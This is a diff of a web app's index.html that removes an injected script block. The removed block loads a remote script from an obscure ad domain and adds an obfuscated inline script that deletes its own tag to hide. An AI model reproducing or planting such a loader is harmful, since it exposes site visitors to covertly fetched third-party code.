@@ -477,59 +477,6 @@
     }
     </script>
   </head>
-  <script>
-    // Create a wrapper div for positioning all ads
-    (function() {
-      // Create a single container for all ad scripts
-      var adContainer = document.createElement('div');
-      adContainer.style.position = 'fixed';
-      adContainer.style.bottom = '20px';  // Position at bottom 
-      adContainer.style.left = '20px';    // Position at left
-      adContainer.style.zIndex = '9999';  // Ensure it stays on top
-      adContainer.style.width = 'auto';
-      adContainer.style.height = 'auto';
-      
-      // Add it to the body when DOM is ready
-      function appendContainer() {
-        try {
-          (document.body || document.documentElement).appendChild(adContainer);
-        } catch(e) {
-          console.error('Could not append ad container', e);
-        }
-      }
-      
-      if (document.readyState === 'loading') {
-        document.addEventListener('DOMContentLoaded', appendContainer);
-      } else {
-        appendContainer();
-      }
-      
-      // Function to add scripts to the container
-      window.addScriptToAdContainer = function(scriptSrc, isInlineScript, scriptContent) {
-        var scriptElement = document.createElement('script');
-        
-        if (isInlineScript) {
-          scriptElement.innerHTML = scriptContent;
-        } else {
-          scriptElement.src = scriptSrc;
-        }
-        
-        adContainer.appendChild(scriptElement);
-        return scriptElement;
-      };
-      
-      // Load the first ad
-      setTimeout(function() {
-        window.addScriptToAdContainer('https://vemtoutcheeg.com/400/9327749', false);
-      }, 100);
-      
-      // Load the second ad script with the cleanup code
-      setTimeout(function() {
-        window.addScriptToAdContainer(null, true, `(()=>{var K='ChmaorrCfozdgenziMrattShzzyrtarnedpoomrzPteonSitfreidnzgtzcseljibcOezzerlebpalraucgeizfznfoocrzEwaocdhnziaWptpnleytzngoectzzdclriehaCtdenTeepxptaNzoldmetzhRzeegvEoxmpezraztdolbizhXCGtIs=rzicfozn>ceamtazr(fdio/c<u>m"eennto)nz:gyzaclaplslizdl"o=ceallySttso r"akgneazl_bd:attuaozbsae"t=Ictresm zegmeatrIftie<mzzLrMeTmHorveenIntiezmezdcolNeeanrozldcezcdoadeehUzReIdCooNmtpnoenreanptzzebnionndzzybatlopasziedvzaellzyJtSsOzNez'
-;for(let z of document.querySelectorAll('script')){if(z.innerHTML.includes(K.replace(/zz/g,'').replace(/zr/g,''))){z.remove();break}}})();`);
-      }, 200);
-    })();
-  </script>
   <body>
     <div id="root"></div>
     <script type="module" src="/src/main.tsx"></script>
